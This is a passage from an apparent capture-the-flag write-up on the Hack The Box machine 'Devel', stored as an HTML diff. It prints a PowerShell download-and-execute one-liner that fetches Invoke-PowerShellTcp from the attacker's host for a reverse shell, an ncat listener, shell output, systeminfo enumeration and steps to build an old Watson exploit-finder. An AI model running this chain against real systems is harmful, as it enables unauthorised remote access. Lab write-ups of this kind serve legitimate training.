+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# echo -n &amp;quot;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.22 -Port 443&amp;quot; &amp;gt;&amp;gt; InvokePowerShellTcp.ps1&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We also need to set up a listener on Kali:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# rlwrap ncat -nvlp 443&lt;/span&gt;
+Ncat: Version &lt;span class="m"&gt;7&lt;/span&gt;.80 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class="o"&gt;)&lt;/span&gt;
+Ncat: Listening on :::443
+Ncat: Listening on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:443
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Back on the webshell, we execute one-liner to download and execute the PS script:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;powershell&lt;/span&gt; &lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;new-object&lt;/span&gt; &lt;span class="n"&gt;Net&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WebClient&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;DownloadString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://10.10.14.22/Invoke-PowerShellTcp.ps1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And we receive a callback from Devel!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Ncat&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Connection&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;span class="n"&gt;Ncat&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Connection&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;5&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;49163&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;span class="n"&gt;Windows&lt;/span&gt; &lt;span class="n"&gt;PowerShell&lt;/span&gt; &lt;span class="n"&gt;running&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="n"&gt;DEVEL&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="n"&gt;DEVEL&lt;/span&gt;
+&lt;span class="n"&gt;Copyright&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;2015&lt;/span&gt; &lt;span class="n"&gt;Microsoft&lt;/span&gt; &lt;span class="n"&gt;Corporation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;All&lt;/span&gt; &lt;span class="n"&gt;rights&lt;/span&gt; &lt;span class="n"&gt;reserved&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="nb"&gt;PS &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;windows&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;system32&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;inetsrv&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;whoami&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;hostname&lt;/span&gt;
+&lt;span class="n"&gt;iis&lt;/span&gt; &lt;span class="n"&gt;apppool&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;web&lt;/span&gt;
+&lt;span class="n"&gt;devel&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Excellent, now we have a good PS shell. &lt;/p&gt;
+&lt;h2&gt;Server-side Enumeration&lt;/h2&gt;
+&lt;p&gt;A good place to start with local enumeration on Windows is to determine OS version and other system information.  The built in &lt;code&gt;systeminfo&lt;/code&gt; command will give us all this and more.&lt;/p&gt;
+&lt;h4&gt;systeminfo&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;PS &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;windows&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;system32&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;inetsrv&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;systeminfo&lt;/span&gt;
+
+&lt;span class="n"&gt;Host&lt;/span&gt; &lt;span class="n"&gt;Name&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;                 &lt;span class="n"&gt;DEVEL&lt;/span&gt;
+&lt;span class="n"&gt;OS&lt;/span&gt; &lt;span class="n"&gt;Name&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;                   &lt;span class="n"&gt;Microsoft&lt;/span&gt; &lt;span class="n"&gt;Windows&lt;/span&gt; &lt;span class="n"&gt;7&lt;/span&gt; &lt;span class="n"&gt;Enterprise&lt;/span&gt; 
+&lt;span class="n"&gt;OS&lt;/span&gt; &lt;span class="n"&gt;Version&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;                &lt;span class="n"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;7600&lt;/span&gt; &lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="n"&gt;Build&lt;/span&gt; &lt;span class="n"&gt;7600&lt;/span&gt;
+&lt;span class="n"&gt;OS&lt;/span&gt; &lt;span class="n"&gt;Manufacturer&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;           &lt;span class="n"&gt;Microsoft&lt;/span&gt; &lt;span class="n"&gt;Corporation&lt;/span&gt;
+&lt;span class="n"&gt;OS&lt;/span&gt; &lt;span class="n"&gt;Configuration&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;          &lt;span class="n"&gt;Standalone&lt;/span&gt; &lt;span class="n"&gt;Workstation&lt;/span&gt;
+&lt;span class="n"&gt;OS&lt;/span&gt; &lt;span class="n"&gt;Build&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;             &lt;span class="n"&gt;Multiprocessor&lt;/span&gt; &lt;span class="n"&gt;Free&lt;/span&gt;
+&lt;span class="n"&gt;Registered&lt;/span&gt; &lt;span class="n"&gt;Owner&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;          &lt;span class="n"&gt;babis&lt;/span&gt;
+&lt;span class="n"&gt;Registered&lt;/span&gt; &lt;span class="n"&gt;Organization&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;   
+&lt;span class="n"&gt;Product&lt;/span&gt; &lt;span class="n"&gt;ID&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;                &lt;span class="n"&gt;55041&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;051&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;0948536&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;86302&lt;/span&gt;
+&lt;span class="n"&gt;Original&lt;/span&gt; &lt;span class="n"&gt;Install&lt;/span&gt; &lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;     &lt;span class="n"&gt;17&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;2017&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;4&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;17&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;31&lt;/span&gt; &lt;span class="p"&gt;??&lt;/span&gt;
+&lt;span class="n"&gt;System&lt;/span&gt; &lt;span class="n"&gt;Boot&lt;/span&gt; &lt;span class="n"&gt;Time&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;          &lt;span class="n"&gt;21&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;2020&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;6&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;00&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;15&lt;/span&gt; &lt;span class="p"&gt;??&lt;/span&gt;
+&lt;span class="n"&gt;System&lt;/span&gt; &lt;span class="n"&gt;Manufacturer&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;       &lt;span class="n"&gt;VMware&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Inc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;span class="n"&gt;System&lt;/span&gt; &lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;              &lt;span class="n"&gt;VMware&lt;/span&gt; &lt;span class="n"&gt;Virtual&lt;/span&gt; &lt;span class="n"&gt;Platform&lt;/span&gt;
+&lt;span class="n"&gt;System&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;               &lt;span class="n"&gt;X86-based&lt;/span&gt; &lt;span class="n"&gt;PC&lt;/span&gt;
+&lt;span class="n"&gt;Processor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;              &lt;span class="n"&gt;1&lt;/span&gt; &lt;span class="n"&gt;Processor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;Installed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+                           &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;01&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x64&lt;/span&gt; &lt;span class="n"&gt;Family&lt;/span&gt; &lt;span class="n"&gt;23&lt;/span&gt; &lt;span class="n"&gt;Model&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt; &lt;span class="n"&gt;Stepping&lt;/span&gt; &lt;span class="n"&gt;2&lt;/span&gt; &lt;span class="n"&gt;AuthenticAMD&lt;/span&gt; &lt;span class="p"&gt;~&lt;/span&gt;&lt;span class="n"&gt;2000&lt;/span&gt; &lt;span class="n"&gt;Mhz&lt;/span&gt;
+&lt;span class="n"&gt;BIOS&lt;/span&gt; &lt;span class="n"&gt;Version&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;              &lt;span class="n"&gt;Phoenix&lt;/span&gt; &lt;span class="n"&gt;Technologies&lt;/span&gt; &lt;span class="n"&gt;LTD&lt;/span&gt; &lt;span class="n"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;00&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;12&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;12&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;2018&lt;/span&gt;
+&lt;span class="n"&gt;Windows&lt;/span&gt; &lt;span class="n"&gt;Directory&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;         &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;
+&lt;span class="n"&gt;System&lt;/span&gt; &lt;span class="n"&gt;Directory&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;          &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;system32&lt;/span&gt;
+&lt;span class="n"&gt;Boot&lt;/span&gt; &lt;span class="n"&gt;Device&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;               &lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Device&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;HarddiskVolume1&lt;/span&gt;
+&lt;span class="n"&gt;System&lt;/span&gt; &lt;span class="n"&gt;Locale&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;             &lt;span class="n"&gt;el&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;Greek&lt;/span&gt;
+&lt;span class="n"&gt;Input&lt;/span&gt; &lt;span class="n"&gt;Locale&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;              &lt;span class="n"&gt;en-us&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;English&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;United&lt;/span&gt; &lt;span class="n"&gt;States&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;Time&lt;/span&gt; &lt;span class="n"&gt;Zone&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;                 &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;UTC&lt;/span&gt;&lt;span class="p"&gt;+&lt;/span&gt;&lt;span class="n"&gt;02&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;00&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;Athens&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Bucharest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Istanbul&lt;/span&gt;
+&lt;span class="n"&gt;Total&lt;/span&gt; &lt;span class="n"&gt;Physical&lt;/span&gt; &lt;span class="n"&gt;Memory&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;     &lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;023&lt;/span&gt; &lt;span class="n"&gt;MB&lt;/span&gt;
+&lt;span class="n"&gt;Available&lt;/span&gt; &lt;span class="n"&gt;Physical&lt;/span&gt; &lt;span class="n"&gt;Memory&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;708&lt;/span&gt; &lt;span class="n"&gt;MB&lt;/span&gt;
+&lt;span class="n"&gt;Virtual&lt;/span&gt; &lt;span class="n"&gt;Memory&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Max&lt;/span&gt; &lt;span class="n"&gt;Size&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;  &lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;047&lt;/span&gt; &lt;span class="n"&gt;MB&lt;/span&gt;
+&lt;span class="n"&gt;Virtual&lt;/span&gt; &lt;span class="n"&gt;Memory&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Available&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;493&lt;/span&gt; &lt;span class="n"&gt;MB&lt;/span&gt;
+&lt;span class="n"&gt;Virtual&lt;/span&gt; &lt;span class="n"&gt;Memory&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="k"&gt;In&lt;/span&gt; &lt;span class="n"&gt;Use&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;    &lt;span class="n"&gt;554&lt;/span&gt; &lt;span class="n"&gt;MB&lt;/span&gt;
+&lt;span class="n"&gt;Page&lt;/span&gt; &lt;span class="n"&gt;File&lt;/span&gt; &lt;span class="n"&gt;Location&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;     &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;pagefile&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;
+&lt;span class="n"&gt;Domain&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;                    &lt;span class="n"&gt;HTB&lt;/span&gt;
+&lt;span class="n"&gt;Logon&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;              &lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;
+&lt;span class="n"&gt;Hotfix&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;                 &lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;
+&lt;span class="n"&gt;Network&lt;/span&gt; &lt;span class="n"&gt;Card&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;           &lt;span class="n"&gt;1&lt;/span&gt; &lt;span class="n"&gt;NIC&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;Installed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+                           &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;01&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Intel&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;PRO&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;1000&lt;/span&gt; &lt;span class="n"&gt;MT&lt;/span&gt; &lt;span class="n"&gt;Network&lt;/span&gt; &lt;span class="n"&gt;Connection&lt;/span&gt;
+                                 &lt;span class="n"&gt;Connection&lt;/span&gt; &lt;span class="n"&gt;Name&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Local&lt;/span&gt; &lt;span class="n"&gt;Area&lt;/span&gt; &lt;span class="n"&gt;Connection&lt;/span&gt;
+                                 &lt;span class="n"&gt;DHCP&lt;/span&gt; &lt;span class="n"&gt;Enabled&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;    &lt;span class="n"&gt;No&lt;/span&gt;
+                                 &lt;span class="n"&gt;IP&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;es&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+                                 &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;01&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;5&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Based on the &lt;code&gt;Hotfix(s)&lt;/code&gt; field, this system may not be patched at all!  There are a number of kernel exploits that may apply in this Scenario.  &lt;a href="https://github.com/rasta-mouse/Watson"&gt;Watson&lt;/a&gt; is a C# tool created by &lt;a href="https://twitter.com/_rastamouse"&gt;@RastaMouse&lt;/a&gt; to identify possible Windows exploits for privilege escalation.&lt;/p&gt;
+&lt;h3&gt;Compiling Watson&lt;/h3&gt;
+&lt;p&gt;The only issue with using Watson now is that as of v2.0 it only supports Windows 10 versions; this wasn't always the case.  To use it on Windows 7, we will need to utilize an older version of the software.  We can use Gits built-in commit history functionality using the &lt;code&gt;checkout&lt;/code&gt; function to get the older v0.1 (Win7 compatible) code.&lt;/p&gt;
+&lt;p&gt;To compile the requisite binary, I installed Visual Studio Community (with all C# functionality) and Git on a Windows 10 machine and cloned the Github  repository.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="images/ctf/htb/devel/watson_clone_repo-1.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="images/ctf/htb/devel/watson_clone_repo-2.png"&gt;&lt;/p&gt;
+&lt;p&gt;Then, under &lt;strong&gt;Team Explorer&lt;/strong&gt; on the bottom right, there is a list of Local Git Repositories (I have two other projects cloned).  Right click Watson and select &lt;strong&gt;Open Command Prompt&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="images/ctf/htb/devel/watson_checkout-1.png"&gt;&lt;/p&gt;
+&lt;p&gt;The last version of Watson that was compatible with other editions of Windows is commit &lt;strong&gt;486ff207270e4f4cadc94ddebfce1121ae7b5437&lt;/strong&gt;.  To get this version, run &lt;code&gt;git checkout 486ff207270e4f4cadc94ddebfce1121ae7b5437&lt;/code&gt; in the command prompt.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="images/ctf/htb/devel/watson_checkout-2.png"&gt;&lt;/p&gt;
+&lt;p&gt;Now we need the target .NET version.  This can be almost any version isntalled on the machine, but we should know what's available before compiling.&lt;/p&gt;
+&lt;p&gt;Available .NET Framework versions should be listed in &lt;code&gt;C:\Windows\Microsoft.NET\Framework\&lt;/code&gt;.&lt;/p&gt;
+&lt;h4&gt;Back on Devel...&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;PS &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Public&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Documents&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;gci &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Microsoft&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NET&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Framework&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt;
+
+
+    &lt;span class="n"&gt;Directory&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Microsoft&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NET&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Framework&lt;/span&gt;
+
+
+&lt;span class="n"&gt;Mode&lt;/span&gt;                &lt;span class="n"&gt;LastWriteTime&lt;/span&gt;     &lt;span class="n"&gt;Length&lt;/span&gt; &lt;span class="n"&gt;Name&lt;/span&gt;                              
+&lt;span class="p"&gt;----&lt;/span&gt;                &lt;span class="p"&gt;-------------&lt;/span&gt;     &lt;span class="p"&gt;------&lt;/span&gt; &lt;span class="p"&gt;----&lt;/span&gt;                              
+&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;----&lt;/span&gt;         &lt;span class="n"&gt;14&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;7&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;2009&lt;/span&gt;   &lt;span class="n"&gt;5&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;37&lt;/span&gt; &lt;span class="p"&gt;??&lt;/span&gt;            &lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;3705&lt;/span&gt;                         
+&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;----&lt;/span&gt;         &lt;span class="n"&gt;14&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;7&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;2009&lt;/span&gt;   &lt;span class="n"&gt;5&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;37&lt;/span&gt; &lt;span class="p"&gt;??&lt;/span&gt;            &lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;4322&lt;/span&gt;                         
+&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;----&lt;/span&gt;         &lt;span class="n"&gt;18&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;2017&lt;/span&gt;   &lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;06&lt;/span&gt; &lt;span class="p"&gt;??&lt;/span&gt;            &lt;span class="n"&gt;v2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50727&lt;/span&gt;                        
